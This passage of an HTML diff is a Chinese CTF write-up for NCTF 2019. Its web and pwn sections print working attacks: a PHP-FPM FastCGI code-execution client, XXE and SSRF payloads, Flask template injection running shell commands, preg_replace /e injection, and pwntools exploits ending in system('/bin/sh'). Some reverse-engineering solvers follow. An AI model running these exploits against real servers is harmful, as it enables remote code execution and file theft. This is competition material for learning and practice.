+                self.requests[requestId]
+        return self.requests[requestId]['response']
+
+    def __repr__(self):
+        return &quot;fastcgi connect host:{} port:{}&quot;.format(self.host, self.port)
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
+    parser.add_argument('host', help='Target host, such as 127.0.0.1')
+    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
+    parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;')
+    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)
+
+    args = parser.parse_args()
+
+    client = FastCGIClient(args.host, args.port, 3, 0)
+    params = dict()
+    documentRoot = &quot;/&quot;
+    uri = args.file
+    content = args.code
+    params = {
+        'GATEWAY_INTERFACE': 'FastCGI/1.0',
+        'REQUEST_METHOD': 'POST',
+        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
+        'SCRIPT_NAME': uri,
+        'QUERY_STRING': '',
+        'REQUEST_URI': uri,
+        'DOCUMENT_ROOT': documentRoot,
+        'SERVER_SOFTWARE': 'php/fcgiclient',
+        'REMOTE_ADDR': '127.0.0.1',
+        'REMOTE_PORT': '9985',
+        'SERVER_ADDR': '127.0.0.1',
+        'SERVER_PORT': '80',
+        'SERVER_NAME': &quot;localhost&quot;,
+        'SERVER_PROTOCOL': 'HTTP/1.1',
+        'CONTENT_TYPE': 'application/text',
+        'CONTENT_LENGTH': &quot;%d&quot; % len(content),
+        'PHP_VALUE': 'auto_prepend_file = php://input',
+        'PHP_ADMIN_VALUE': 'safe_mode=Off\nopen_basedir=Off\ndisable_functions=Off\nallow_url_include = On'
+    }
+    response = client.request(params, content)
+    print(force_text(response))
+</code></pre>
+
+<h3 id="fake-xml-cookbook">Fake XML cookbook</h3>
+<p>F12看了一眼发现</p>
+<pre><code>function doLogin(){
+    var username = $(&quot;#username&quot;).val();
+    var password = $(&quot;#password&quot;).val();
+    if(username == &quot;&quot; || password == &quot;&quot;){
+        alert(&quot;Please enter the username and password!&quot;);
+        return;
+    }
+
+    var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; 
+    $.ajax({
+        type: &quot;POST&quot;,
+        url: &quot;doLogin.php&quot;,
+        contentType: &quot;application/xml;charset=utf-8&quot;,
+        data: data,
+        dataType: &quot;xml&quot;,
+        anysc: false,
+        success: function (result) {
+            var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
+            var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;
+            if(code == &quot;0&quot;){
+                $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);
+            }else if(code == &quot;1&quot;){
+                $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);
+            }else{
+                $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);
+            }
+        },
+        error: function (XMLHttpRequest,textStatus,errorThrown) {
+            $(&quot;.msg&quot;).text(errorThrown + ':' + textStatus);
+        }
+    }); 
+}
+</code></pre>
+
+<p>用XML和服务器通讯，联想到XXE攻击</p>
+<p>burp抓post包得到</p>
+<pre><code>POST /doLogin.php HTTP/1.1
+Host: nctf2019.x1ct34m.com:40002
+Content-Length: 207
+Accept: application/xml, text/xml, */*; q=0.01
+Origin: http://nctf2019.x1ct34m.com:40002
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
+DNT: 1
+Content-Type: application/xml;charset=UTF-8
+Referer: http://nctf2019.x1ct34m.com:40003/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
+</code></pre>
+
+<p>根据js脚本可以发现username是可以回显的</p>
+<p>然后构造一下exp</p>
+<pre><code>POST /doLogin.php HTTP/1.1
+Host: nctf2019.x1ct34m.com:40002
+Content-Length: 207
+Accept: application/xml, text/xml, */*; q=0.01
+Origin: http://nctf2019.x1ct34m.com:40002
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
+DNT: 1
+Content-Type: application/xml;charset=UTF-8
+Referer: http://nctf2019.x1ct34m.com:40003/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;
+ ]&gt;
+
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
+</code></pre>
+
+<h3 id="true-xml-cookbook">True XML cookbook</h3>
+<p>XML+SSRF打内网</p>
+<pre><code>POST /doLogin.php HTTP/1.1
+Host: nctf2019.x1ct34m.com:40003
+Content-Length: 220
+Accept: application/xml, text/xml, */*; q=0.01
+Origin: http://nctf2019.x1ct34m.com:40003
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
+DNT: 1
+Content-Type: application/xml;charset=UTF-8
+Referer: http://nctf2019.x1ct34m.com:40003/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://192.168.1.8&quot;&gt;
+ ]&gt;
+
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
+</code></pre>
+
+<p>NCTF{XXE-labs_is_g00d}</p>
+<h3 id="flask">flask</h3>
+<p>模板注入,用通配符读flag</p>
+<pre><code>http://nctf2019.x1ct34m.com:40007/%7B%7B''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('cat%20/fla?%27).read()%7D%7D
+</code></pre>
+
+<h3 id="upload-your-shell">Upload your Shell</h3>
+<p>传一个图片马,会返回一个题目本身就准备好的图片马的所在目录
+找个地方包含一下就好了</p>
+<pre><code>http://nctf2019.x1ct34m.com:60002/index.php?action=/upload-imgs/9ae46c526dfb6d96e95ad35bfbb2b6c4/Th1s_is_a_fl4g.jpg
+</code></pre>
+
+<h3 id="replace">replace</h3>
+<p>填三个"#"报错</p>
+<pre><code>Parse error: syntax error, unexpected end of file in /var/www/html/index.php(70) : regexp code on line 1
+
+Fatal error: preg_replace(): Failed evaluating code: # in /var/www/html/index.php on line 70
+</code></pre>
+
+<p>实现功能使用的是preg_replace()</p>
+<p>题目提示用了php5.6</p>
+<p>想到preg_replace() /e参数</p>
+<p>试一下可以执行phpinfo()</p>
+<pre><code>POST /index.php HTTP/1.1
+Host: nctf2019.x1ct34m.com:40006
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+Origin: http://nctf2019.x1ct34m.com:40006
+Connection: close
+Referer: http://nctf2019.x1ct34m.com:40006/index.php
+Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g
+Upgrade-Insecure-Requests: 1
+
+sub=text&amp;pat=e&amp;rep=phpinfo();
+</code></pre>
+
+<p>但是直接用readfile('/flag')读文件，发现单引号被拦截</p>
+<p>于是用chr()拼接表示字符串。。。。。</p>
+<pre><code>POST /index.php HTTP/1.1
+Host: nctf2019.x1ct34m.com:40006
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+Origin: http://nctf2019.x1ct34m.com:40006
+Connection: close
+Referer: http://nctf2019.x1ct34m.com:40006/index.php
+Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g
+Upgrade-Insecure-Requests: 1
+
+sub=text&amp;pat=e&amp;rep=readfile(chr(47).chr(102).chr(108).chr(97).chr(103));
+</code></pre>
+
+<h2 id="pwn">Pwn</h2>
+<h3 id="hello_pwn">hello_pwn</h3>
+<p>连接nc后发现让我用pwntools
+构造exp
+<img alt="" src="https://md.byr.moe/uploads/upload_786ab5d56bc516d0dc8f353dad62a19c.png" />
+获得flag</p>
+<h3 id="pwn_me_1">pwn_me_1</h3>
+<p>基础栈溢出</p>
+<pre><code>from pwn import *
+a=remote(&quot;139.129.76.65&quot;,&quot;50004&quot;)
+ad=0x400861
+payload='yes\0'+'a'*12+p64(0x66666666)
+a.sendline(payload)
+a.interactive()
+</code></pre>
+
+<h3 id="pwn_me_2">pwn_me_2</h3>
+<p>基础格式化字符串</p>
+<pre><code>#coding:utf-8
+
+from pwn import *
+
+path = './pwn_me_2'
+local = 0
+attach = 0
+#P = ELF(path)
+context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
+context.log_level = 'debug'
+
+if local == 1:
+    p = process(path)
+    if context.arch == 'amd64':
+        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    else:
+        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+else:
+    p = remote('139.129.76.65',50005)
+
+p.recvuntil('but your name:\n')
+p.send('%p'*15)
+
+p.recvuntil('preparing......\n')
+base = int(p.recv(14),16) - (0x55f5229a5080-0x000055f5227a3000)
+log.success('base = '+hex(base))
+
+target = base+0x2020e0
+
+p.recvuntil('what do you want?\n')
+payload = '%'+str(0x66)+'c%10$hhn'+'%'+str(0x666666-0x66)+'c%11$lln....'+p64(target)+p64(target+1) 
+p.send(payload)
+
+#NCTF{rrr_loves_pwn_and_100years}
+if attach == 1:
+    gdb.attach(p)
+p.interactive()
+</code></pre>
+
+<h3 id="pwn_me_3">pwn_me_3</h3>
+<p>基础unlink</p>
+<pre><code>#coding:utf-8
+
+from pwn import *
+
+path = './pwn_me_3'
+local = 1
+attach = 0
+#P = ELF(path)
+context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
+context.log_level = 'debug'
+
+if local == 0:
+    p = process(path)
+    if context.arch == 'amd64':
+        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    else:
+        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+else:
+    p = remote('139.129.76.65',50006)
+
+def add(size,content):
+    p.recvuntil('5,exit\n')
+    p.sendline('1')
+    p.recvuntil('size:\n')
+    p.sendline(str(size))
+    p.recvuntil('content:\n')
+    p.send(content)
+
+def delete(index):
+    p.recvuntil('5,exit\n')
+    p.sendline('2')
+    p.recvuntil('idx:\n')
+    p.sendline(str(index))
+
+def show(index):
+    p.recvuntil('5,exit\n')
+    p.sendline('3')
+    p.recvuntil('idx\n')
+    p.sendline(str(index))
+
+def edit(index,content):
+    p.recvuntil('5,exit\n')
+    p.sendline('4')
+    p.recvuntil('idx:\n')
+    p.sendline(str(index))
+    p.recvuntil('content:\n')
+    p.send(content)
+
+add(0x10,'\x00'*0x10) #0
+add(0x10,'\x11'*0x10) #1
+delete(0)
+delete(1)
+
+p.recvuntil('5,exit\n')
+p.sendline('1')
+p.recvuntil('size:\n')
+p.sendline('0')
+p.recvuntil('content:\n')
+
+edit(0,'\x50')
+show(0)
+heap_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x50
+log.success('heap_addr = '+hex(heap_addr))
+
+add(0x38,'\x11'*0x30) #1
+add(0xf0,'\x22'*0xf0) #2
+add(0x20,'\x33'*0x20) #3
+
+delete(1)
+payload = p64(0) + p64(0x31) + p64(0x6020e8-0x18) + p64(0x6020e8-0x10) + p64(0)*2 + p64(0x30)
+add(0x38,payload)
+delete(2)
+
+payload = p64(0)*2 + p64(heap_addr+0x10)
+edit(1,payload)
+
+edit(0,p64(0x66666666))
+p.recvuntil('5,exit\n')
+p.sendline('5')
+
+#NCTF{Ohh!h0pe_y0u_c4n_pwn_100years_too}
+if attach == 1:
+    gdb.attach(p)
+p.interactive()
+</code></pre>
+
+<h3 id="warmup">warmup</h3>
+<p>基础rop</p>
+<pre><code>#coding:utf-8
+
+from pwn import *
+
+path = './warm_up'
+local = 1
+attach = 0
+P = ELF(path)
+context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
+context.log_level = 'debug'
+
+if local == 0:
+    p = process(path)
+    if context.arch == 'amd64':
+        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    else:
+        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+else:
+    p = remote('139.129.76.65',50007)
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+p.recvuntil('p!!!\n')
+p.send('\x11'*0x18+'\x12')
+
+p.recvuntil('\x12')
+canary = u64(p.recv(7)+'\x00')
+log.success('canary = '+hex(canary))
+
+p.recvuntil('?')
+payload = p64(0)*3 + '\x00' + p64(canary)[:7]
+payload+= p64(0)
+payload+= p64(0x400ab6)
+p.send(payload)
+
+p.recvuntil('warm up!!!')
+p.send('\x11'*0x2f+'\x12')
+p.recvuntil('\x12')
+libcbase = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['__libc_start_main'] - 240
+log.success('libcbase = '+hex(libcbase))
+
+p_rdx_rsi = 0x00000000001150c9 + libcbase
+p_rdi = 0x400bc3
+p_rbp = 0x400970
+leave = 0x400a49
+flag_addr = 0x601a00 + 0x98
+p.recvuntil('?')
+payload = p64(0)*3 + '\x00' + p64(canary)[:7]
+payload+= p64(0)
+payload+= p64(p_rdi) + p64(0)
+payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601a00)
+payload+= p64(libcbase+libc.sym['read'])
+payload+= p64(p_rbp) + p64(0x601a00)
+payload+= p64(leave)  
+p.send(payload)
+
+raw_input()
+payload = p64(0x601a00)
+payload+= p64(p_rdi) + p64(flag_addr)
+payload+= p64(p_rdx_rsi) + p64(0) + p64(0)
+payload+= p64(libcbase+libc.sym['open'])
+payload+= p64(p_rdi) + p64(3)
+payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00)
+payload+= p64(libcbase+libc.sym['read'])
+payload+= p64(p_rdi) + p64(1)
+payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00)
+payload+= p64(libcbase+libc.sym['write'])
+payload+= './flag'
+p.send(payload)
+
+if attach == 1:
+    gdb.attach(p)
+p.interactive()
+</code></pre>
+
+<h3 id="easy_rop">easy_rop</h3>
+<p>基础rop</p>
+<pre><code>#coding:utf-8
+
+from pwn import *
+
+path = './easy_rop'
+local = 1
+attach = 0
+P = ELF(path)
+context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
+context.log_level = 'debug'
+
+if local == 0:
+    p = process(path)
+    if context.arch == 'amd64':
+        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    else:
+        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+else:
+    p = remote('139.129.76.65',50002)
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+for i in range(26):
+    p.recvuntil(': ')
+    p.sendline(str(0))
+
+p.recvuntil(': ')
+p.sendline('+') 
+p.recvuntil(': ')
+p.sendline('+')
+
+p.recvuntil(': ')
+p.sendline('+')
+p.recvuntil('28 = ')
+base1 = int(p.recvuntil('\n',drop=True),10)
+log.success('base1 = '+hex(base1))
+
+p.recvuntil(': ')
+p.sendline('+')
+p.recvuntil('29 = ')
+base2 = int(p.recvuntil('\n',drop=True),10)
+log.success('base2 = '+hex(base2))
+
+base = str(hex(base2))+str(hex(base1))[2:]
+base = int(base,16) - (0x55e9d0e36b40-0x000055e9d0e36000) 
+log.success('base = '+hex(base))
+
+start = base + 0x8a0
+start1 = str(hex(start))[2:6]
+start2 = str(hex(start))[6:]
+start1 = int(start1,16)
+start2 = int(start2,16)
+p.recvuntil(': ')
+p.sendline(str(start2))
+p.recvuntil(': ')
+p.sendline(str(start1))
+
+p.recvuntil(': ')
+p.sendline('+')
+p.recvuntil(': ')
+p.sendline('+')
+
+p.recvuntil('your name?\n')
+p.send('\x00')
+#======================================
+for i in range(26):
+    p.recvuntil(': ')
+    p.sendline(str(0))
+
+p.recvuntil(': ')
+p.sendline('+') 
+p.recvuntil(': ')
+p.sendline('+')
+
+target = base + 0x201420
+target1 = str(hex(target))[2:6]
+target2 = str(hex(target))[6:]
+target1 = int(target1,16)
+target2 = int(target2,16)
+p.recvuntil(': ')
+p.sendline(str(target2))
+p.recvuntil(': ')
+p.sendline(str(target1))
+
+leave = base + 0xb31
+leave1 = str(hex(leave))[2:6]
+leave2 = str(hex(leave))[6:]
+leave1 = int(leave1,16)
+leave2 = int(leave2,16)
+p.recvuntil(': ')
+p.sendline(str(leave2))
+p.recvuntil(': ')
+p.sendline(str(leave1))
+
+p.recvuntil(': ')
+p.sendline('+') 
+p.recvuntil(': ')
+p.sendline('+')
+
+part1 = base + 0xb96
+part2 = base + 0xb80
+def call_fun(fun_addr,arg1,arg2,arg3):
+    payload = p64(part1)
+    payload+= p64(0) 
+    payload+= p64(0)
+    payload+= p64(1)
+    payload+= p64(fun_addr)
+    payload+= p64(arg1)
+    payload+= p64(arg2)
+    payload+= p64(arg3)
+    payload+= p64(part2)
+    payload+= 'a'*0x38
+    return payload
+
+p_rdi = base + 0xba3
+p_rbp = base + 0x900
+p.recvuntil('your name?\n')
+payload = p64(target)
+payload+= p64(p_rdi)
+payload+= p64(P.got['puts']+base)
+payload+= p64(P.plt['puts']+base)
+payload+= call_fun(P.got['read']+base,0x100,base+0x201500,0)
+payload+= p64(p_rbp)
+payload+= p64(base+0x201500)
+payload+= p64(leave)
+p.send(payload)
+
+libcbase = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['puts']
+log.success('libcbase = '+hex(libcbase))
+
+payload = p64(base+0x201500)
+payload+= p64(p_rdi)
+payload+= p64(libcbase+libc.search('/bin/sh\x00').next())
+payload+= p64(libcbase+libc.sym['system'])
+p.send(payload)
+
+#NCTF{rop_1s_b4st!!!!}
+if attach == 1:
+    gdb.attach(p)
+p.interactive()
+</code></pre>
+
+<h3 id="easy_heap">easy_heap</h3>
+<p>两次fb_atk</p>
+<pre><code>#coding:utf-8
+
+from pwn import *
+
+path = './easy_heap'
+local = 1
+attach = 0
+#P = ELF(path)
+context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
+context.log_level = 'debug'
+
+if local == 0:
+    p = process(path)
+    if context.arch == 'amd64':
+        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    else:
+        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+else:
+    p = remote('139.129.76.65',50001)
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def new(size,content):
+    p.recvuntil('4. exit\n')
+    p.sendline('1')
+    p.recvuntil('size?\n')
+    p.sendline(str(size))
+    p.recvuntil('ontent?\n')
+    p.send(content)
+
+def delete(index):
+    p.recvuntil('4. exit\n')
+    p.sendline('2')
+    p.recvuntil('index?\n')
+    p.sendline(str(index))
+
+def show(index):
+    p.recvuntil('4. exit\n')
+    p.sendline('3')
+    p.recvuntil('index?\n')
+    p.sendline(str(index))
+
+
+p.recvuntil('your name?\n')
+p.send(p64(0)+p64(0x60))
+
+new(0x50,'\x00'*0x50) #0
+new(0x50,'\x11'*0x50) #1
+delete(0)
+delete(1)
+delete(0)
+
+new(0x50,p64(0x602060))
+new(0x50,'\x33'*0x50)
+new(0x50,'\x44'*0x50)
+payload = p64(0) + p64(0x1000) + p64(0)*8
+new(0x50,payload)
+
+new(0x80,'\x00') #0
+new(0x60,'\x11'*0x60) #1
+delete(0)
+show(0)
+p.recvuntil('0: ')
+libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f54cfedab78-0x00007f54cfb16000)
+log.success('libcbase = '+hex(libcbase))
+
+new(0x60,'\x22'*0x60)
+delete(1)
+delete(2)
+delete(1)
+
+new(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23))
+new(0x60,'\x00')
+new(0x60,'\x00')
+one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147]
+payload = '\x00'*0x13 + p64(libcbase+one_gadget[2])
+new(0x60,payload)
+
+delete(6)
+
+if attach == 1:
+    gdb.attach(p)
+p.interactive()
+</code></pre>
+
+<h2 id="re">Re</h2>
+<h3 id="_1">签到题</h3>
+<p>IDA打开
+<img alt="Re-qd.png" src="https://i.loli.net/2019/11/24/C3X15khTDGui2ce.png" />
+进到<code>sub_401340</code>中
+<img alt="Re-qd2.png" src="https://i.loli.net/2019/11/24/tmxWzDM46hvZjUu.png" />
+就是有一个7*7的矩阵和我们输入的49位字符的ASCII码按列排布构成的矩阵(第一列是a[0]~a[6])相乘会得到dword_404000
+<img alt="Re-qd3.png" src="https://i.loli.net/2019/11/24/Vx2GAdrJKE4Wcyz.png" />
+除了<code>dword_404000[0]=4884h</code>外都是4行代表一个元素,即</p>
+<pre><code>dword_404000[1]=91C4h
+dword_404000[2]=7D35h
+dword_404000[3]=81FEh
+...
+</code></pre>
+
+<p>然后就是求解非齐次线性方程组了
+$$
+ \left{
+ \begin{matrix}
+   12 &amp; 53 &amp; 6 &amp; 34 &amp; 58 &amp; 36 &amp; 1 \
+   83 &amp; 85 &amp; 12 &amp; 73 &amp; 27 &amp; 96 &amp; 52 \
+   78 &amp; 53 &amp; 24 &amp; 36 &amp; 86 &amp; 25 &amp; 46 \
+   39 &amp; 78 &amp; 52 &amp; 9 &amp; 62 &amp; 37 &amp; 84 \
+   23 &amp; 6 &amp; 14 &amp; 74 &amp; 48 &amp; 12 &amp; 83 \
+   27 &amp; 85 &amp; 92 &amp; 42 &amp; 48 &amp; 15 &amp; 72 \
+   4 &amp; 6 &amp; 3 &amp; 67 &amp; 0 &amp; 26 &amp; 68 
+  \end{matrix}
+  \right} \tag{1}
+$$
+$$
+ \left{
+ \begin{matrix}
+   a1[0] &amp; a1[7] &amp; a1[14] &amp; a1[21] &amp; a1[28] &amp; a1[35] &amp; a1[42] \
+   a1[1] &amp; a1[8] &amp; a1[15] &amp; a1[22] &amp; a1[29] &amp; a1[36] &amp; a1[43] \
+   a1[2] &amp; a1[9] &amp; a1[16] &amp; a1[23] &amp; a1[30] &amp; a1[37] &amp; a1[44] \
+   a1[3] &amp; a1[10] &amp; a1[17] &amp; a1[24] &amp; a1[31] &amp; a1[38] &amp; a1[45] \
+   a1[4] &amp; a1[11] &amp; a1[18] &amp; a1[25] &amp; a1[32] &amp; a1[39] &amp; a1[46] \
+   a1[5] &amp; a1[12] &amp; a1[19] &amp; a1[26] &amp; a1[33] &amp; a1[40] &amp; a1[47] \
+   a1[6] &amp; a1[13] &amp; a1[20] &amp; a1[27] &amp; a1[34] &amp; a1[41] &amp; a1[48] 
+  \end{matrix}
+  \right} \tag{2}
+$$
+$$
+ \left{
+ \begin{matrix}
+   d[0] &amp; d[7] &amp; d[14] &amp; d[21] &amp; d[28] &amp; d[35] &amp; d[42] \
+   d[1] &amp; d[8] &amp; d[15] &amp; d[22] &amp; d[29] &amp; d[36] &amp; d[43] \
+   d[2] &amp; d[9] &amp; d[16] &amp; d[23] &amp; d[30] &amp; d[37] &amp; d[44] \
+   d[3] &amp; d[10] &amp; d[17] &amp; d[24] &amp; d[31] &amp; d[38] &amp; d[45] \
+   d[4] &amp; d[11] &amp; d[18] &amp; d[25] &amp; d[32] &amp; d[39] &amp; d[46] \
+   d[5] &amp; d[12] &amp; d[19] &amp; d[26] &amp; d[33] &amp; d[40] &amp; d[47] \
+   d[6] &amp; d[13] &amp; d[20] &amp; d[27] &amp; d[34] &amp; d[41] &amp; d[48] 
+  \end{matrix}
+  \right} \tag{3}
+$$
+<code>(1) * (2) = (3)</code>
+NCTF{nctf2019_linear_algebra_is_very_interesting}</p>
+<h3 id="debug">debug</h3>
+<p>IDA打开
+我没截图2333，不过可以通过动调来得到答案，好像是中途生成flag来和输入的字符串比较
+只需要再比较的地方下断点，查看栈即可得到答案。</p>
+<h3 id="easy-ternary">Easy Ternary</h3>
+<p>AHK脚本语言很明白了，直接到exe里把脚本提出来</p>
+<pre><code>XOR(a, b)
+{
+    tempA := a
+    tempB := b
+    ret := 0
+    Loop, 8
+    {
+        ret += Mod((((tempA &gt;&gt; ((A_Index - 1)*4)) &amp; 15) + ((tempB &gt;&gt; ((A_Index - 1)*4)) &amp; 15)),3) * (16**(A_Index-1))
+    }
+    return ret
+}
+InputBox, userInput, TTTTCL, Input your flag:
+if(ErrorLevel)
+    Exit
+if(!StrLen(userInput))   #没有读入
+{
+    MsgBox, GG
+    Exit
+}
+inputArr := []   #保存输入的数据
+Loop, parse, userInput
+{
+    temp:=A_Index
+    inputArr.Push(Ord(A_LoopField))    #读入读入框
+}
+inputNum := []     #操作后保存的数组
+Loop % inputArr.Length()
+{
+    temp := inputArr[A_Index]     
+    temp := DllCall(&quot;aiQG.dll\?ToTrit@@YAII@Z&quot;, &quot;UInt&quot;, temp)
+    inputNum.push(temp)       
+}
+key1 := XOR(inputNum[5], inputNum[inputNum.Length()])   #key就是{}的XOR
+inputFlag := []
+Loop % inputArr.Length()
+{
+    temp := XOR(inputNum[A_Index], key1)
+    if(Mod(A_Index,2))
+    {
+        temp := XOR(key1,temp)
+    }
+    inputFlag.push(temp)
+}
+temp1 := 1  #是否成功
+Loop % inputFlag.Length()     #检验
+{
+    temp := inputFlag[A_Index]
+    temp := DllCall(&quot;aiQG.dll\?Check@@YAIII@Z&quot;, &quot;UInt&quot;, temp, &quot;UInt&quot;, A_Index)
+    if(!temp)
+    {
+        temp1 := 0
+    }
+}
+if(temp1)
+{
+    MsgBox, Ok
+}
+if(!temp1)
+{
+    MsgBox, GG
+}
+</code></pre>
+
+<p>调用了dll,逆向dll，发现就一个对比数字和转三进制
+exp：</p>
+<pre><code>#include&lt;cstdio&gt;
+#include&lt;cmath&gt;
+#include&lt;windows.h&gt;
+using namespace std;
+int xors(int a,int b)
+{
+    int ret=0;
+    for(int i=1;i&lt;=8;i++)
+        ret=ret+(((a&gt;&gt;(((i-1)*4))&amp;15)+((b&gt;&gt;((i-1)*4))&amp;15))%3)*(pow(16,(i-1)));
+    return ret;
+} 
+int change(int x)
+{
+    int t,ans=0,k=0;
+    while(x)
+    {
+        t=x%10;
+        ans=ans+pow(3,k++)*t;
+        x/=10;
+    }
+    return ans;
+}
+void genS()
+{
+    int data[100]={0x00,0x10011,0x21020,0x21101,0x21000,0x22211,0x2220,0x21200,0x2101,0x22120,0x20122,0x22220,0x2021,0x10122,0x20102,0x22111,0x211,0x12012,0x2210,0x22202,0x2021,0x21101,0x2222,0x21101,0x2222,0x21121,0x21120,0x22210};
+    for(int c=1;c&lt;=27;c++)
+    {
+        for(int i=0;i&lt;=0x22222222;i++)
+        {
+            int t=xors(i,0x22212);
+            if(c%2)
+                t=xors(0x22212,t);
+            if(t==data[c])
+            {
+                printf(&quot;%X,&quot;,i);
+                break;
+            }   
+        }   
+    }
+}
+int main()
+{
+    int s[1000]={2220,2111,10010,2121,11120,10011,10112,10222,11002,1210,11102,10112,2001,1220,11020,11002,1221,10001,11111,10112,10010,10010,10010,10010,10000,2211,11122,0};
+    for(int i=0;s[i]!=0;i++)
+        printf(&quot;%c&quot;,change(s[i]));
+    return 0;
+}
+
+</code></pre>
+
+<h3 id="_2">丑陋的代码</h3>
+<p>确实够丑陋的，到处跳转
+IDA打开后发现有反调试，nop掉，发现原来无法运行的函数可以运行了(之前异或了)
+鉴于无法F5，开始头铁时间，发现最后就是个TEA</p>
+<pre><code>#include&lt;cstdio&gt;
+#define _DWORD int
+using namespace std;
+unsigned char code[]={0x88,0x71,0x3E,0xFE,0x66,0xF6,0x77,0xD7,0xA0,0x51,0x29,0xF9,0x11,0x79,0x71,0x49,0xF1,0x61,0xA0,0x9,0xF1,0x29,0x1,0xB1};
+/*
+tea_decrypt(0x61869F5E,0x0A9CF08D);
+tea_decrypt(0xAD74C0CA,0xA57F16B8);
+tea_decrypt(0xB559626D,0xD17B68E0);*/
+int getlowbit(int x)
+{
+    return x&amp;0xFF;
+}
+void tea_decrypt(unsigned long v0,unsigned long v1) 
+{     
+     unsigned long sum=0xC6EF3720,i; 
+     unsigned long delta=0x9e3779b9;                          
+     unsigned long k0=0x12345678,k1=0xBADF00D,k2=0x05201314,k3=0x87654321;     
+     for(i=0;i&lt;32;i++) 
+     {                               
+         v1-=((v0&lt;&lt;4)+k2)^(v0+sum)^((v0&gt;&gt;5)+k3);
+         v0-=((v1&lt;&lt;4)+k0)^(v1+sum)^((v1&gt;&gt;5)+k1);
+         sum-=delta;                 
+     }
